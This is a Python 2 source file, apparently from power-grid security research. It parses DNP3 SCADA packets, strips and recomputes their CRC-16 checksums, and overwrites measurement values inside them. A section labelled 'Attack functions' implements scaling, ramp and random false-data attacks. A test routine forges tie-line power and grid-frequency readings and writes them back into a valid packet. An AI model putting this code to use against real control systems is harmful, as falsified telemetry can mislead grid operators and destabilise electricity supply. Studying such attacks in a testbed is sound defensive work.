import sys
import struct
import random
import time
#from calc_crc import calc_crc_chksum
import crcmod
from helpers import hex_to_float,float_to_hex,hex_to_byte
calc_crc=crcmod.predefined.mkPredefinedCrcFun('crc-16-dnp')
def calc_crc_chksum(s):
	hex_val=hex(calc_crc(s))[2:]
	strlen=4-len(hex_val)
	while strlen>0:
		#we need to pad zeros
		hex_val= '0'+hex_val
		strlen-=1
	hexbyte=hex_to_byte(hex_val)
	return hexbyte[1]+hexbyte[0]	
def hex_to_int(s):
	while(len(s) < 4):
		s = s+'\x00'
        return struct.unpack('<i',s)[0]
#########################################################		
def is_integrity_poll(payload):
	# We just know where to look for based on the specific device as integrity poll depends on the total capacity of the DNP3 slave
	# At this point this is device specific
	if (payload[190]=='\x01'and payload[191]== '\x1e' and payload[192]=='\x05' and payload[193]=='\x01'):
		return 1
	else:
		return 0

def crc_locations_int_poll(pyld_len):
	# just a quick calculation
	#caution: this payload length is only for the floating point section
	loc=16
	index=0
	crc_pos=[]
	total_blocks=6
	while index<(total_blocks-1):
		crc_pos.append(loc+18*(index))
		index+=1
	crc_pos.append(pyld_len-2)
	#print "TOTAL BLOCKS:"+str(total_blocks)+",CRC_BLOCKS:"
	for i in crc_pos:
		#print str(i)
		temp=0
	return crc_pos
		
def get_item_int_poll(index,trim_pyld):
	# We are just writing a function specific to integrity poll
	value=0
	err=0
	num_items=(len(trim_pyld)-8)/5
	if index>num_items:
		err = 1
	else:
		val_idx=8+5*index
		value=hex_to_float(trim_pyld[val_idx+1:val_idx+5])
	ans=[value,err]
	return ans

def put_item_int_poll(index,value,trim_pyld):
	# Search for that item
	loop=1
	pos=8
	err=0
	num_items=(len(trim_pyld)-8)/5
	if index>num_items:
		err = 1
	else:
		val_idx=8+5*index
		trim_pyld=trim_pyld[:val_idx+1]+float_to_hex(value)+trim_pyld[val_idx+5:]
	ans=[trim_pyld,err]
	return ans

def trim_crc_int_poll(pyld_new,crc_pos):
	#lets trim out the unwanted items
	initial_pyld=pyld_new[:190]
	pyld=pyld_new[190:]
	trim_pyld=pyld[:16]
	#print "LENGTH OF NEW:"+str(len(pyld))
	#print pyld.encode('hex')
	index=0
	for i in crc_pos:
		if (i+2)== len(pyld):
			continue
		elif (i+18)>(len(pyld)-1):
			trim_block=pyld[(i+2):(len(pyld)-2)]
		else:
			trim_block=pyld[(i+2):(i+18)]
		#print str(trim_block.encode('hex'))+"LEN:"+str(len(trim_block))
		#print "BEFORE:"+str(trim_pyld.encode('hex'))
		trim_pyld= trim_pyld+trim_block
		#print "AFTER:"+str(trim_pyld.encode('hex'))
		
	#print trim_pyld.encode('hex')
	#print "LEN:"+str(len(trim_pyld))
	ans=[trim_pyld,initial_pyld]
	return ans

def join_crc_int_poll(trim_pyld,initial_pyld):
	#joining blocks with crc
	total_blocks=6
	i=0
	full_pyld=initial_pyld
	while i<total_blocks:
		if ((i+1)*16 < len(trim_pyld)):
			trim_block=trim_pyld[i*16:(i+1)*16]
		else:
			trim_block=trim_pyld[i*16:]
		i+=1
		crc_ins='\x00\x00'
		crc_ins= calc_crc_chksum(trim_block)
		#print "BLOCK:"+trim_block.encode('hex')
		#print "CRC:"+crc_ins.encode('hex')
		full_pyld=full_pyld+trim_block+crc_ins
	
	#print "B:"+str(total_blocks)	
	#print "LENGTH:"+str(len(full_pyld))
	#print "FROM THE FUNCTION"
	#print full_pyld.encode('hex')
	return full_pyld

#############################################################
def is_fpt_change(pyld):
	#Check the payload
	if pyld[15]=='\x20' and pyld[16]=='\x05':
		return 1
	else:
		return 0

def crc_locations(pyld):
	pyld_len=len(pyld)
	crc_pos=[26]
	i=26
	# Just check how many items are there
	total_items=no_items(pyld)
	if len(pyld)<20:
		crc_pos=[]
	else:
		while i< pyld_len:
			if (i+18)< (pyld_len-1):
				crc_pos.append(i+18)
			i+=18
	
	total_blocks=no_blocks(total_items)
	#print "Total items:"+str(total_blocks)+",crc_pos:"+str(len(crc_pos))+",length of payload:"+str(pyld_len)
	diff=total_blocks-len(crc_pos)
	while diff>0:
		# There are items left
		crc_pos.append(len(pyld)-2)
		diff=total_blocks-len(crc_pos)
	
	#print and check the list
	for var in crc_pos:
		#print "LIST"+str(var)
		temp=0
	return crc_pos

def no_blocks(total_items):
	num=(10+7*total_items)
	if num%16 ==0:
		total_blocks=num/16
	else:
		total_blocks=num/16+1
	return total_blocks

def no_items(pyld):
	if len(pyld)<20:
		total_items=0
	else:
		total_items=hex_to_int(pyld[18:20])
	return total_items
	
def trim_crc(pyld,crc_pos):
	#lets trim out the unwanted items
	trim_pyld=pyld[:26]
	index=0
	debug_mode=1
	#print pyld[:26].encode('hex')
	for i in crc_pos:
		if (index+1)==len(crc_pos):
			break
		else:
			trim_pyld= trim_pyld+pyld[(crc_pos[index]+2):crc_pos[index+1]]
			#if debug_mode==1:
				#print pyld[(crc_pos[index]+2):crc_pos[index+1]].encode('hex')
			index+=1
	initial_pyld=trim_pyld[:10]		
	trim_pyld=trim_pyld[10:]
	#print trim_pyld.encode('hex')
	#print "LEN:"+str(len(trim_pyld))
	ans=[trim_pyld,initial_pyld]
	return ans

def join_crc(trim_pyld,initial_pyld):
	#joining blocks with crc
	total_blocks=no_blocks((len(trim_pyld)-10)/7)
	i=0
	full_pyld=initial_pyld
	while i<total_blocks:
		if ((i+1)*16 < len(trim_pyld)):
			trim_block=trim_pyld[i*16:(i+1)*16]
		else:
			trim_block=trim_pyld[i*16:]
		i+=1
		crc_ins='\x00\x00'
		crc_ins= calc_crc_chksum(trim_block)
		#print "CRC:"+crc_ins.encode('hex')+"\n"
		full_pyld=full_pyld+trim_block+crc_ins
	
	#print "B:"+str(total_blocks)	
	#print "LENGTH:"+str(len(full_pyld))
	#print full_pyld.encode('hex')
	return full_pyld

def get_item(index,trim_pyld):
	# Search until you hit an item
	# the first item is at index 10
	loop=1
	pos=10
	value=''
	err=0
	index_val=hex_to_int(trim_pyld[pos:(pos+2)])
	while loop==1:
		if pos > len(trim_pyld)-1:
			loop=0
			value=hex_to_float('\x00\x00\x00\x00')
			err=1
			break
		index_val=hex_to_int(trim_pyld[pos:(pos+2)])
		#print str(index_val)+","+str(pos)+","+str(len(trim_pyld))
		if index==index_val:
			value=hex_to_float(trim_pyld[(pos+3):(pos+7)])
			break
		pos+=7
	#print "INDEX:"+str(pos)
	ans=[value,err]
	return ans

def put_item(index,value,trim_pyld):
	# Search for that item
	loop=1
	pos=10
	err=0
	index_val=hex_to_int(trim_pyld[pos:(pos+2)])
	while loop==1:
		if pos > len(trim_pyld)-1:
			print "ERROR_PUT_ITEM!"+str(pos)
			loop=0
			err=1
			break
		index_val=hex_to_int(trim_pyld[pos:(pos+2)])
		print "INDEX SEARCH:"+str(index_val)
		if index==index_val:
			trim_pyld=trim_pyld[:(pos+3)]+float_to_hex(value)+trim_pyld[(pos+7):]
			print "Value being put in is: ["+str(index)+"]:"+str(value)
			break
		pos+=7
	ans=[trim_pyld,err]
	return ans
##############################################################
# Attack functions
def scaling(attack_value,scaling_factor=0.049):
	# Implement scaling attack
	return (1+scaling_factor)*attack_value

def ramp(attack_value,t,ramp_factor=0.0024):
	# Implement ramp attack,check what the unit of 't' is
	return ramp_factor*t+attack_value

def rand(ulim,llim):
	# Implement random attack
	
	return random.uniform(llim,ulim)

def testing():
	previous_meas=74.5687
	initial_time=time.time()
	for i in range(3):
		time.sleep(4)
		current_time=time.time()
		tdiff=current_time-initial_time
		previous_attack_val=ramp(previous_meas,tdiff)
		#print "TIME DIFF:"+str(tdiff)+"ATTACK VAL"+str(previous_attack_val)

def test_routine():
	# Test the functions with a dummy payload
	#print "HELLO"
	payload='\x05\x64\x2b\x44\x64\x00\x01\x00\xae\xa5\xf3\xec\x81\x00\x00\x20\x05\x28\x04\x00\x06\x00\x01\xb7\x29\x70\xa3\x6c\x42\x0a\x00\x01\xb7\x29\x70\x42\x01\x00\x01\xd5\x38\xde\x42\x09\xd6\x7d\x00\x01\xe2\xbc\x30\x41\x21\x9c'
	payload='\x05\x64\x24\x44\x64\x00\x01\x00\x4c\xe1\xf4\xe1\x81\x00\x00\x20\x05\x28\x03\x00\x00\x00\x01\xc8\x42\x02\x7d\xec\x00\x01\x63\x00\x70\x42\x01\x00\x01\xc0\x23\x6b\xc1\xe2\x4a\x3a\x99'
	payload1='\x05\x64\x24\x44\x64\x00\x01\x00\x4c\xe1\xee\xec\x81\x00\x00\x20\x05\x28\x03\x00\x01\x00\x01\x77\x58\xc5\x1b\x97\xc1\x02\x00\x01\xa8\x92\x6f\x42\x00\x00\x01\xe3\xc7\x8e\x42\x53\x18'
	
	payload2='\x05\x64\x24\x44\x64\x00\x01\x00\x4c\xe1\xcb\xe9\x81\x00\x00\x20\x05\x28\x03\x00\x00\x00\x01\x87\x22\x91\x57\xa6\x42\x01\x00\x01\x2d\x2f\x3a\xc1\x02\x00\x01\x85\xf4\x6f\x42\xdf\xc8'
	payload3='\x05\x64\x24\x44\x64\x00\x01\x00\x4c\xe1\xcc\xea\x81\x00\x00\x20\x05\x28\x03\x00\x00\x00\x01\xee\x26\x92\x16\x6c\x42\x02\x00\x01\xd7\x1f\x70\x42\x01\x00\x01\xfe\xf8\x35\xc1\xb4\xbf'
	payload_array=[payload1,payload2,payload3]
	for payload in payload_array:
		print "__________________________________"
		crc_pos=crc_locations(payload)
		[trim_pyld,initial_pyld]=trim_crc(payload,crc_pos)
		payload_joined=join_crc(trim_pyld,initial_pyld)
		#if payload == payload_joined:
		#	print "THEY ARE THE SAME!"
		#else:
		#	print "THEY ARE DIFFERENT!"
		for index in range(3):
			[value,err]=get_item(index,trim_pyld)
			if err==1:
				print "NO GET:"+str(index)
			else:
				print "VALUE:"+str(value)
			value=100.011
			
			print "==========================="
			[trim_pyld,err]=put_item(index,value,trim_pyld)
			if err ==1:
				print "NO PUT:"+str(index)
			print "==========================="
			[value,err]=get_item(index,trim_pyld)
			if err==1:
				print "NO GET:"+str(index)
			else:
				print "VALUE after replacement:"+str(value)
			print "==========================="
		#print str(hex_to_int(trim_pyld[45:49]))
	print "+++++++++++++++++++++++"

def test_attack_func():
	attack_targets=[0,1,2]
	initial_time=time.time()
	scheduled_tie=[76.38,-10.30]
	previous_meas=[0.0,0.0,0.0]
	previous_attack_val=[0.0,0.0,0.0]
	testing_val=[74.1032510872,-4.51487787598,59.9941527113]
	payload='\x05\x64\x2b\x44\x64\x00\x01\x00\xae\xa5\xf3\xec\x81\x00\x00\x20\x05\x28\x04\x00\x06\x00\x01\xb7\x29\x70\xa3\x6c\x42\x0a\x00\x01\xb7\x29\x70\x42\x01\x00\x01\xd5\x38\xde\x42\x09\xd6\x7d\x00\x01\xe2\xbc\x30\x41\x21\x9c'
	# if floating point change is present we modify appropriately
	# We determine the location of the application chunks and CRCs
	crc_pos=crc_locations(payload)
	# In order to keep our analysis easy, we trim out the CRCs and calculate them later
	[trim_pyld,initial_pyld]=trim_crc(payload,crc_pos)
	# We now read the particular item we want to change and change it
	err_values=[0,0,0]
	index=0
	print "FPC!"
	for i in attack_targets:
		[value,err_values[index]]=get_item(i,trim_pyld)
		if err_values[index]==0:
			previous_meas[index]=value
		 	# If the payload has those variables, we called the attack functions to find
			# what values need to be replaced
			#previous_attack_val=attack.scaling(previous_meas[index])
			# Ramp attack depends on time, so we calculate elapsed time
			current_time=time.time()
			tdiff=current_time-initial_time
			previous_attack_val[index]=ramp(previous_meas[index],tdiff)
			previous_attack_val[index]=testing_val[index]
			# Choose a random value between the two limits
			ulim=10 # MW
			llim= 5 # MW
			#previous_attack_val=attack.rand(ulim,llim)
			# We need to calculate the frequency measurement based on the other values
			if i==2:
				del_P_load=(previous_attack_val[0]-scheduled_tie[0]+previous_attack_val[1]-scheduled_tie[1])/1000
				previous_attack_val[2]= 60.0 -del_P_load/((3/5.0))
				previous_attack_val[2]=testing_val[index]
			if previous_attack_val[index]<0.001:
				print "VALUE:"+str(previous_attack_val)+"SEP:"+str(previous_meas)
			# We need to add the attack value to the unchanged value
			new_val=previous_attack_val[index]
			# We insert the value back into the payload
			[trim_pyld,err]=put_item(i,new_val,trim_pyld)
			print "VALUE PUT IN IS:"+str(new_val)
			[value,err_values[index]]=get_item(i,trim_pyld)
			print "VALUE ACTUALLY PUT IN IS:"+str(value)
			
		index+=1
					
		# When we are ready to join, we use this function to put things back together
		payload_joined=join_crc(trim_pyld,initial_pyld)
		crc_pos=crc_locations(payload)
		# In order to keep our analysis easy, we trim out the CRCs and calculate them later
		[trim_pyld,initial_pyld]=trim_crc(payload,crc_pos)
		for i in range(3):
			[value,err_values[i]]=get_item(i,trim_pyld)
			print "VALUE ACTUALLY PUT IN IS:"+str(value)
		
		
################################################################
def main():
	# Test the functions with a dummy payload
	#print "HELLO"
	payload1='\x05\x64\x55\x44\x64\x00\x01\x00\x95\x73\xff\xe2\x81\x00\x00\x20\x05\x28\x0a\x00\x03\x00\x01\xca\x01\xb2\x09\x5e\x42\x05\x00\x01\x71\x3e\xdc\x42\x08\x00\x01\xad\x68\xdb\xc2\x02\x5b\x48\x00\x01\x08\xfa\x6f\x42\x06\x00\x01\xf0\xfa\x6f\x42\x0a\x00\x01\xe0\xe6\xfb\xfa\x6f\x42\x00\x00\x01\x8a\x5c\x91\x42\x04\x00\x01\x5e\xf3\x30\xf7\x90\xc2\x01\x00\x01\x99\x22\x66\xc1\x09\x00\x01\x54\x60\x66\x41\x6b\x52'
	payload2=payload1[:86]
	payload2=payload2[:18]+'\x08'+payload2[19:]
	payload3=payload1[:31]
	payload3=payload3[:18]+'\x01'+payload3[19:]
	payload4=payload1[:38]
	payload4=payload4[:18]+'\x02'+payload4[19:]
	payload5=payload1[:45]
	payload5=payload5[:18]+'\x03'+payload5[19:]
	int_ans=hex_to_int(payload1[20:22])
	payload=payload1
	fpc=1
	if payload[15]=='\x20' and payload[16]=='\x05':
	#	#print " This is floating point change...!"
		fpc=1
	##print str(no_items(payload))
	if fpc:
		crc_pos=crc_locations(payload)
		[trim_pyld,initial_pyld]=trim_crc(payload,crc_pos)
		payload_joined=join_crc(trim_pyld,initial_pyld)
		#if payload == payload_joined:
			#print "THEY ARE THE SAME!"
		#else:
			#print "THEY ARE DIFFERENT!"
		
		[trim_pyld,err]=put_item(0,123.123,trim_pyld)
		if err==1:
			temp=0
			#print "ERROR IN REPLACING ITEM for FPC!"
		value_flt=get_item(0,trim_pyld)
		#print "VALUE 1:"+str(value_flt)
		#print "CASE 1"
		#crc_locations(payload1)
		#print "CASE 2"
		#crc_locations(payload2)
		#print "CASE 3"
		#crc_locations(payload3)
		#print "CASE 4"
		#crc_locations(payload4)
		#print "CASE 5"
		#crc_locations(payload5)
		
	# Here we can test the integrity poll scenario
	fd=open('dummy_packet.txt','r')
	payload=fd.read()
	fd.close()
	# Now we test it on all the functions
	#print "IS THIS INTEGRITY POLL:"+str(is_integrity_poll(payload))
	#caution: crc_locations takes only length from floating point section
	crc_pos=crc_locations_int_poll(len(payload[190:]))
	#print str(crc_pos)
	[trim_pyld,initial_pyld]=trim_crc_int_poll(payload,crc_pos)
	payload_joined=join_crc_int_poll(trim_pyld,initial_pyld)
	#if payload == payload_joined:
		#print "THEY ARE THE SAME!"
	#else:
		#print "THEY ARE DIFFERENT!"
	#print "LEN COMP:"+str(len(payload_joined))+">>>:"+str(len(payload))
	[trim_pyld,err]=put_item_int_poll(2,123.123,trim_pyld)
	#if err==1:
		#print "ERROR IN REPLACING ITEM!"
	[value_flt,err]=get_item_int_poll(2,trim_pyld)
	#if err==1:
		#print "ERROR IN REPLACING ITEM!"
	#print "VALUE 1:"+str(value_flt)

#Call main for testing		
#main()
test_routine()
print "HEX TO FLOAT OF 100.0:"+str(hex_to_float(float_to_hex(100.0)))
#test_attack_func()	
